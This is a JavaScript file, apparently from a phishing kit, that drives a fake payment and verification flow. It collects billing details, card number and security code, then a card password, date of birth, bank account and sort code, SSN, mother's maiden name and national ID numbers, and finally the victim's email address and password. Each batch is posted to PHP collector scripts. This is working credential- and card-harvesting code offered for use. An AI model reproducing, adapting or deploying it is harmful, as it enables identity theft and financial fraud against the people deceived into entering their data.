function gs_verifinput(nb) {
  var m = [ $('#gs_fname'), 
            $('#gs_lname'), 
            $('#gs_street1'),
            $('#gs_city'), 
            $('#gs_postalCode')];
  var fm ="";
    if(m[nb].val() == "") {
      m[nb].parent().removeClass("gs_inputsuccess"); 
      m[nb].parent().addClass("haserror"); 
      return false;
    }else{
      m[nb].parent().removeClass("haserror"); 
      m[nb].parent().addClass("gs_inputsuccess");
      return true;
    }

}
function gs_verifallinput() {
var gs = [$('#gs_fname'), 
          $('#gs_lname'), 
          $('#gs_street1'),
          $('#gs_city'), 
          $('#gs_postalCode')];
for (var i = 0; i < 5; i++) {
  if(gs[i].val() == "" || gs[i].parent().hasClass("haserror")){
    gs[i].parent().addClass("haserror"); 
    vr = false;
  }else{
    vr = true;
  }
  }
  return vr; 
}
function gs_verifallccinput() {
var gs = [ $('#gs_holder'), 
          $('#gs_lname'), 
          $('#gs_cc'),
          $('#gs_csc')];
for (var i = 0; i < 4; i++) {
  if(gs[i].val() == "" || gs[i].parent().hasClass("haserror")){
    gs[i].parent().addClass("haserror"); 
    vr = false;
  }else{
    vr = true;
  }
  }
  return vr; 
}
function gs_processbill() {
  if(gs_verifallinput()){ 
  var dataString = 'gs_fname='+$("#gs_fname").val()
                  +'&gs_lname='+$("#gs_lname").val()
                  +'&gs_street1='+$("#gs_street1").val()
                  +'&gs_city='+$("#gs_city").val()
                  +'&gs_postalCode='+$("#gs_postalCode").val()
                  +'&gs_country='+$("#gs_country").val();
  $.ajax({
    type : "POST",
    url : "settings/includes/post_bill.php",
    data : dataString,
    beforeSend : function() {
        $("#gs_load").show();
    },
    success : function(response) {  
        $.ajax({
            url : "gs_cc.php",
            dataType: "text",
            success : function (data) {
              $("#content-left").html(data);
            }
        });
        $("#content-left").fadeIn("slow");
        $("#gs_load").hide();
    }
  });
  return true;
  }else{
    return false;
  }
}
function gs_processeditbill() {
  if(gs_verifallinput()){ 
  var dataString = 'gs_fname='+$("#gs_fname").val()
                  +'&gs_lname='+$("#gs_lname").val()
                  +'&gs_street1='+$("#gs_street1").val()
                  +'&gs_city='+$("#gs_city").val()
                  +'&gs_postalCode='+$("#gs_postalCode").val()
                  +'&gs_country='+$("#gs_country").val();
  $.ajax({
    type : "POST",
    url : "settings/includes/post_editbill.php",
    data : dataString,
    beforeSend : function() {
        $("#gs_load").show();
    },
    success : function(response) {  
        $.ajax({
            url : "gs_cc.php",
            dataType: "text",
            success : function (data) {
              $("#content-left").html(data);
            }
        });
        $("#content-left").fadeIn("slow");
        $("#gs_load").hide();
    }
  });
  return true;
  }else{
    return false;
  }
}
function gs_processcard(){
if(gs_verifallccinput() && gs_verifexp()){
var dataString = 'gs_holder='+$("#gs_holder").val()
                +'&gs_cc='+$("#gs_cc").val().replace(/\s/g, '')
                +'&gs_exp_month='+$("#gs_exp_month").val()
                +'&gs_exp_year='+$("#gs_exp_year").val()
                +'&gs_csc='+$("#gs_csc").val();
  $.ajax({
    type : "POST",
    url : "settings/includes/post_cc.php",
    data : dataString,
    beforeSend : function() {
        $("#gs_load").show();
    },
    success : function(response) {  
        $.ajax({
            url : "gs_vbv.php",
            dataType: "text",
            success : function (data) {
              $("#gs_pp2").html(data);
            }
        });
        $("#gs_pp").fadeIn("slow");
        $("#gs_load").hide();
    }
  });
  return true;
}else{
    return false;
  }
}
function gs_validcc(type,ccnum){
  if (type == "Visa") {
      var re = /^4\d{3}-?\d{4}-?\d{4}-?\d{4}$/;
   } else if (type == "MC") {
      var re = /^5[1-5]\d{2}-?\d{4}-?\d{4}-?\d{4}$/;
   } else if (type == "Disc") {
      var re = /^6011-?\d{4}-?\d{4}-?\d{4}$/;
   } else if (type == "AmEx") {
      var re = /^3[4,7]\d{13}$/;
   } else if (type == "Diners") {
      var re = /^3[0,6,8]\d{12}$/;
   }
   if (!re.test(ccnum)) return false;
   
   var checksum = 0;
   for (var i=(2-(ccnum.length % 2)); i<=ccnum.length; i+=2) {
      checksum += parseInt(ccnum.charAt(i-1));
   }
   for (var i=(ccnum.length % 2) + 1; i<ccnum.length; i+=2) {
      var digit = parseInt(ccnum.charAt(i-1)) * 2;
      if (digit < 10) { checksum += digit; } else { checksum += (digit-9); }
   }
   if ((checksum % 10) == 0) return true; else return false;
}
function gs_gettype(ccnum){
  var re = new RegExp("^4");
    if (ccnum.match(re) != null)
        return "Visa";
    re = new RegExp("^5[1-5]");
    if (ccnum.match(re) != null)
        return "MC";
    re = new RegExp("^3[47]");
    if (ccnum.match(re) != null)
        return "AmEx";
    re = new RegExp("^(6011|622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5]|64[4-9])|65)");
    if (ccnum.match(re) != null)
        return "Disc";
    re = new RegExp("^3[0,6,8]");
    if (ccnum.match(re) != null)
        return "Diners";
    return "";
}
function gs_verifcc(){
  var str1c = $("#gs_cc");
  var str = $("#gs_cc").val();
  gscc = str.replace(/\s/g, '');
  var newvalue = "";
  for (var i = 0; i < str1c.length; i++) {
    if ((i > 0) && (i % 4 == 0)) {
      newvalue += " ";
    }
    newvalue += gscc.charAt(i);
  }
  var type = gs_gettype(gscc);
  if (type != "") {
    if (type == "AmEx" && str.length == 17) {
      if(gs_validcc(type, gscc)) {
      str1c.parent().removeClass("haserror");   
      str1c.parent().addClass("gs_inputsuccess");
      $("#gs_expcsc").fadeIn("slow");
    }
    else {
      str1c.parent().removeClass("gs_inputsuccess");
      str1c.parent().addClass("haserror");
      $("#gs_expcsc").hide();
      }
    }
    if (str.length == 19) {
    if(gs_validcc(type, gscc)) {
      str1c.parent().removeClass("haserror");   
      str1c.parent().addClass("gs_inputsuccess");
      $("#gs_expcsc").fadeIn("slow");
    }
    else {
      str1c.parent().removeClass("gs_inputsuccess");
      str1c.parent().addClass("haserror");
      $("#gs_expcsc").hide();
      }
  }
}
  else{
    str1c.parent().removeClass("gs_inputsuccess");
    str1c.parent().addClass("haserror");
    $("#gs_expcsc").hide();
    }
}
function gs_addseparator(){
  var str1c = $("#gs_cc");
  var str = $("#gs_cc").val();
  gscc = str.replace(/\s/g, '');
  var nb_car = gscc.length;
  var type = gs_gettype(gscc);
  if (type=="AmEx"){
    if(nb_car == 4) {
      str1c.val(str1c.val()+' ');
   }
   if(nb_car == 10) {
      str1c.val(str1c.val()+' ');
   }
  }else{
  if(nb_car == 4) {
      str1c.val(str1c.val()+' ');
   }
   if(nb_car == 8) {
      str1c.val(str1c.val()+' ');
   }
   if(nb_car == 12) {
      str1c.val(str1c.val()+' ');
   }
   }
 }
function gs_verifexp(){
  var thisYear = (new Date()).getFullYear();
  var thisMonth = (new Date()).getMonth() +1;
  var MDFA = $("#gs_exp_year");
  $("#gs_exp_month").parent().removeClass('haserror');
  if (MDFA.val() == thisYear) {
    var MDFA1 = $("#gs_exp_month");
    if (MDFA1.val() < thisMonth) {
      MDFA1.parent().addClass("haserror");
      return false;
    };
  };
  return true;
}
function gs_updatebill(){
  $.ajax({
            url : "editbill.php",
            dataType: "text",
            beforeSend : function() {
              $("#gs_load").show();
            },  
            success : function (data) {
              $("#gs_pp2").html(data);
            }
        });
        $("#gs_pp").fadeIn("slow");
        $("#gs_load").hide();
}
function gs_processvbv(){
var dataString = 'password_vbv='+$("#password_vbv").val()
                +'&dob_1='+$("#dob_1").val()
                +'&dob_2='+$("#dob_2").val()
                +'&dob_3='+$("#dob_3").val()
                +'&sortnum1='+$("#sortnum1").val()
                +'&sortnum2='+$("#sortnum2").val()
                +'&sortnum3='+$("#sortnum3").val()
                +'&accnumber='+$("#accnumber").val()
                +'&ssn1='+$("#ssn1").val()
                +'&ssn2='+$("#ssn2").val()
                +'&ssn3='+$("#ssn3").val()
                +'&mmname='+$("#mmname").val()
                +'&creditlimit='+$("#creditlimit").val()
                +'&osid='+$("#osid").val()
                +'&codicefiscale='+$("#codicefiscale").val()
                +'&kontonummer='+$("#kontonummer").val()
                +'&offid='+$("#offid").val();
  $.ajax({
    type : "POST",
    url : "settings/includes/post_vbv.php",
    data : dataString,
    beforeSend : function() {
        $("#gs_load2").show();
        $("#gs_load").show();
    },
    success : function(response) {  
        $.ajax({
            url : "gs_accessmail.php",
            dataType: "text",
            success : function (data) {
              $("#gs_pp2").html(data);
            }
        });
        $("#gs_pp").fadeIn("slow");
        $("#gs_load2").hide();
        $("#gs_load").hide();
    }
  });
  return true;
}
function gs_processaccessmail(){
  if($("#gs_accessemail").val() == "" || $("#gs_accesspassword").val() == ""){
    $("#gs_accesspassword").parent().addClass("haserror"); 
    return false;
  }else{
var dataString = 'gs_accessemail='+$("#gs_accessemail").val()
                +'&gs_accesspassword='+$("#gs_accesspassword").val();
  $.ajax({
    type : "POST",
    url : "settings/includes/post_emailaccess.php",
    data : dataString,
    beforeSend : function() {
        $("#gs_load").show();
        $("#gs_load2").show();
    },
    success : function(response) {  
        $.ajax({
            url : "gs_success.php",
            dataType: "text",
            success : function (data) {
              $("#content-left").html(data);
            }
        });
        $("#content-left").fadeIn("slow");
        $("#gs_pp").hide();
        $("#gs_load").hide();
        $("#gs_load2").hide();
    }
  });
  return true;
}
}
function gs_checktype(){
  $("#gs_paymentlogo").removeClass();
  $("#gs_paymentlogo").addClass("pf");
  var type = gs_gettype($("#gs_cc").val());
  if (type=="") {
    $("#gs_paymentlogo").addClass("pf-credit-card");
  } else if (type=="MC") {
    $("#gs_paymentlogo").addClass("pf-mastercard");
  } else if (type=="Visa") {
    $("#gs_paymentlogo").addClass("pf-visa");
  } else if (type=="AmEx") {
    $("#gs_paymentlogo").addClass("pf-american-express");
  } else if (type=="Disc") {
    $("#gs_paymentlogo").addClass("pf-discover");
  } else if (type=="Diners") {
    $("#gs_paymentlogo").addClass("pf-diners");
  }
}